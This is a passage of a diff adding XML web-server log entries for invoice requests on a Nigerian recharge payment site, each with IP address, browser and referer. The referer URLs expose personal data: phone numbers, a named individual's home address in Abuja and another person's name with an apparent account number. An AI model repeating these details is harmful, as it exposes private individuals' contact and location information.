+  <request>/invoice&amp;id=121_133888</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=NATIONAL%20INST%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>10-12-2019 23:29:52</date>
+  <ip>41.190.12.85</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_133889</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=GRANDEX%20NIGLTD%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>10-12-2019 23:30:40</date>
+  <ip>41.190.12.85</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_133890</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=CORINTHIA%20VILLA%20HOTEL%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>11-12-2019 09:01:18</date>
+  <ip>41.190.14.34</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 6.0; Infinix HOT 4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=171_126828</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/</referer>
+ </log>
+ <log>
+  <date>11-12-2019 09:01:34</date>
+  <ip>41.190.14.34</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 6.0; Infinix HOT 4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=171_126828</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/</referer>
+ </log>
+ <log>
+  <date>11-12-2019 09:06:31</date>
+  <ip>41.190.14.34</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 6.0; Infinix HOT 4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=171_126828</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/index</referer>
+ </log>
+ <log>
+  <date>11-12-2019 18:12:41</date>
+  <ip>41.190.12.44</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 6.0; Infinix HOT 4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=171_126828</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/index</referer>
+ </log>
+ <log>
+  <date>11-12-2019 19:45:32</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_135081</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=07058883434&amp;detail2=07058883434</referer>
+ </log>
+ <log>
+  <date>12-12-2019 15:05:29</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_135747</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=METROPOLE%20DEVELOPMENT%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>12-12-2019 15:07:29</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_135752</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=AFRI%20HOTEL%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>12-12-2019 15:10:43</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_135753</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=AFRI%20HOTEL%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>12-12-2019 15:12:44</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_135758</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=METROPOLE%20DEVELOPMENT%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>12-12-2019 15:13:40</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_135760</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=METROPOLE%20DEVELOPMENT%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>12-12-2019 15:14:37</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_135761</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=METROPOLE%20DEVELOPMENT%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>12-12-2019 15:16:06</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_135766</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=DIAMOND%20BANK%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>12-12-2019 15:31:08</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_135776</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=IVORY%20PROPERTIES%20LTD%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>12-12-2019 15:32:19</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_135778</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=DUNES%20NIG%20LTD%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>12-12-2019 15:34:01</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_135780</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=DUNES%20NIG%20LTD%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>12-12-2019 15:34:26</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_135781</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=DUNES%20NIG%20LTD%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>12-12-2019 15:36:31</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_135782</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=DUNES%20NIG%20LTD%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>12-12-2019 15:37:42</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_135784</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=DUNES%20NIG%20LTD%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>12-12-2019 15:54:58</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_135806</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=CORINTHIA%20VILLA%20HOTEL%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>12-12-2019 16:03:50</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_135807</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=CORINTHIA%20VILLA%20HOTEL%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>12-12-2019 16:17:24</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_135822</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=CHOSCHARIS%20PLAZA%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>12-12-2019 16:19:01</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_135826</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=CHOSCHARIS%20PLAZA%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>12-12-2019 18:57:54</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_135866</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=08091195268&amp;detail2=08091195268</referer>
+ </log>
+ <log>
+  <date>12-12-2019 20:29:38</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_135880</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=08033311088&amp;detail2=08033311088</referer>
+ </log>
+ <log>
+  <date>12-12-2019 21:03:44</date>
+  <ip>41.190.12.72</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=121_116431</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>12-12-2019 21:04:27</date>
+  <ip>41.190.12.72</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=121_89079</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>12-12-2019 21:04:41</date>
+  <ip>41.190.12.72</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=121_31087</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>12-12-2019 21:04:46</date>
+  <ip>41.190.12.72</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=121_20827</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>12-12-2019 21:04:54</date>
+  <ip>41.190.12.72</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=121_8562</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>12-12-2019 21:04:57</date>
+  <ip>41.190.12.72</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=121_8858</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>12-12-2019 21:05:01</date>
+  <ip>41.190.12.72</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=121_8897</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>12-12-2019 21:07:47</date>
+  <ip>41.190.12.72</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=121_8978</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>13-12-2019 13:26:40</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_135880</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=08033311088&amp;detail2=08033311088</referer>
+ </log>
+ <log>
+  <date>13-12-2019 13:52:43</date>
+  <ip>197.242.120.31</ip>
+  <hostname>197.242.120.31</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=206_136787</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=08133283315&amp;detail2=08133283315</referer>
+ </log>
+ <log>
+  <date>13-12-2019 14:08:38</date>
+  <ip>197.210.58.113</ip>
+  <hostname>197.210.58.113</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=121_136784</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>13-12-2019 15:54:29</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_136939</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=OROZO%20HOTEL%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>13-12-2019 16:16:10</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_136939</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=OROZO%20HOTEL%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>13-12-2019 16:51:55</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_137001</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=NATIONAL%20MOSQUE%20%20%20%20&amp;detail2=main%20mosque%20building%20%20st%20central%20area125279422</referer>
+ </log>
+ <log>
+  <date>13-12-2019 17:21:49</date>
+  <ip>197.210.226.250</ip>
+  <hostname>197.210.226.250</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 8.1.0; TECNO CF8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/</referer>
+ </log>
+ <log>
+  <date>13-12-2019 18:32:32</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_137027</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=EAT%20N%20GO%20NIGERIA%20LTD%20%20%20%20&amp;detail2=kumasi%20street%20off%20aminu%20%20st%20central%20area233867541</referer>
+ </log>
+ <log>
+  <date>13-12-2019 20:38:30</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_137056</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=SIR%20MICHEAL%20ONYEWUENYI%20%20&amp;detail2=NO%2025%20ALEXANDRIA%20CRESCENT%20WUSE%202%20Und%20St%20Wuse%202</referer>
+ </log>
+ <log>
+  <date>13-12-2019 20:52:39</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_137060</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=MR%20MICHEALONYEWUE%20%20&amp;detail2=NO%2025%20ALEXANDRIAN%20CRESCENT%20WUSE%202%20ABUJA%20Und%20St%20Wuse%202</referer>
+ </log>
+ <log>
+  <date>13-12-2019 20:53:49</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_137060</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=MR%20MICHEALONYEWUE%20%20&amp;detail2=NO%2025%20ALEXANDRIAN%20CRESCENT%20WUSE%202%20ABUJA%20Und%20St%20Wuse%202</referer>
+ </log>
+ <log>
+  <date>13-12-2019 22:03:41</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_137079</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=CHURCH%20GATE%20PLAZA%20%20%20%20&amp;detail2=cad%20zone%20central%20ar%20%20st%20garki%201434285877</referer>
+ </log>
+ <log>
+  <date>13-12-2019 22:06:18</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_137080</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=DELITA%20TOWER%20HOUSE%20%20%20%20&amp;detail2=central%20area%20abuja%20%20st%20central%20area210584126</referer>
+ </log>
+ <log>
+  <date>13-12-2019 22:15:44</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_137083</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=ZEUS%20PARADISE%20HOTEL%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>13-12-2019 22:16:26</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_137084</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=ZEUS%20PARADISE%20HOTEL%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>13-12-2019 22:27:50</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_137086</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=NEWTON%20PARK%20ANNEX%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>13-12-2019 22:29:10</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_137087</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=NEWTON%20PARK%20ANNEX%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>13-12-2019 22:30:19</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_137088</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=NEWTON%20PARK%20ANNEX%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>13-12-2019 22:56:01</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_137089</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=NEWTON%20PARK%20HOTEL%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>13-12-2019 22:58:30</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_137090</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=NEWTON%20PARK%20HOTEL%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>13-12-2019 22:59:32</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_137091</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=NEWTON%20PARK%20HOTEL%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>14-12-2019 09:01:59</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_137142</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=08026044434&amp;detail2=08026044434</referer>
+ </log>
+ <log>
+  <date>14-12-2019 12:14:48</date>
+  <ip>197.210.71.122</ip>
+  <hostname>197.210.71.122</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=121_137526</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=DANIEL%20MANZO%20RAMBAI%20%20JOY%20-&amp;detail2=2658921020</referer>
+ </log>
+ <log>
+  <date>14-12-2019 16:29:44</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_137142</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=08026044434&amp;detail2=08026044434</referer>
+ </log>
